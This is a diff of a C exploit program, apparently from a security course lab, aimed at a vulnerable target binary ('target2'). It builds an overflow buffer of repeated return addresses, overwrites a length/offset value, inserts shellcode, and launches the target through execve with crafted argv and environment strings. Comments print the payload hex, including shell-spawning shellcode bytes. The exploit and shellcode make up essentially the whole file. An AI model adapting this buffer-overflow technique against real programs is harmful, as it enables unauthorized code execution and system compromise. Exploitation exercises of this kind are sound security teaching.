@@ -5,62 +5,134 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target2"
+#define LENGTH 268
+#define ADDR_LEN 4
+#define REST_LEN 284 - LENGTH + 2
 
-/*
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[1];
+	char *	env[5];
+
+	char exploit[LENGTH] = "";
+
+	int i = 0;
+	while(i < (LENGTH - ADDR_LEN) / ADDR_LEN){
+		strcat(exploit, "\x50\xfe\x21\x30"); // garbage value
+		i++;
+	}
+	
+	strcat(exploit, "\x1b\x01\x00\x00"); // offset hex(283) = 0x11b
+
+	for(i = 0; i < strlen(shellcode); i++){
+		exploit[i] = shellcode[i];
+	}
 
 	args[0] = TARGET;
-	args[1] = "hi there";
-	args[2] = NULL;
+	args[1] = exploit;
+	args[2] = NULL; 
 
-	env[0] = NULL;
+	env[0] = "\x00"; // complete the address of var(len)
 
-	if ( execve (TARGET, args, env) < 0 )
+	env[1] = "\x17\x01\x00\x00"; // offset hex(279) = 0x117
+	env[2] = "\x00"; 
+	
+	env[3] = "\x80\xfd\x21\x30\x80\xfd\x21\x30\x80\xfd\x21\x30";
+	env[4] = NULL;
+
+	if (execve (TARGET, args, env) < 0)
 		fprintf (stderr, "execve failed.\n");
 
 	return (0);
 }
-*/
 
-int
-main ( int argc, char * argv[] )
-{
-    char* args[3];
-    char* env[1];
+// Printing char *argv[]:
+// argv[0] Printing Hex Code:
+// \x2e\x2e\x2f\x74
+// \x61\x72\x67\x65
+// \x74\x73\x2f\x74
+// \x61\x72\x67\x65
+// \x74\x32\x00\x00
+// 
+// argv[1] Printing Hex Code:
+// \xeb\x1f\x5e\x89
+// \x76\x08\x31\xc0
+// \x88\x46\x07\x89
+// \x46\x0c\xb0\x0b
+// \x89\xf3\x8d\x4e
+// \x08\x8d\x56\x0c
+// \xcd\x80\x31\xdb
+// \x89\xd8\x40\xcd
+// \x80\xe8\xdc\xff
+// \xff\xff\x2f\x62
+// \x69\x6e\x2f\x73
+// \x68\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x50\xfe\x21\x30
+// \x1b\x01\x00\x00 // *(+263) = 283
 
-    int i;
-    char buf[271];
-
-    args[0] = TARGET;
-
-    // Instantiate with NOP's ('\x90')
-    for (i = 0 ; i < 271; i++) {
-        buf[i] = '\x90';
-    }
-
-    // Copy shellcode into buf
-    for (i = 19; i < 64; i++) {
-        buf[i] = shellcode[i-19];
-    }
-
-    buf[264] = '\x0b';
-
-    buf[xxx] = '\xxx';
-    buf[xxx] = '\xxx';
-    buf[xxx] = '\xxx';
-
-    args[1] = buf;
-    args[2] = NULL;
-
-    env[0] = &buf[xxx];
-    env[1] = xxx;
-
-    if ( execve (TARGET, args, env) < 0 )
-		fprintf (stderr, "execve failed.\n");
-
-	return (0);
-}
+// Printing char *env[]:
+// env[0] Printing Hex Code:
+// 
+// env[1] Printing Hex Code:
+// \x17\x01\x00\x00 // *(+267) = 279
+// 
+// env[2] Printing Hex Code:
+// 
+// env[3] Printing Hex Code:
+// \x80\xfd\x21\x30
+// \x80\xfd\x21\x30
+// \x80\xfd\x21\x30
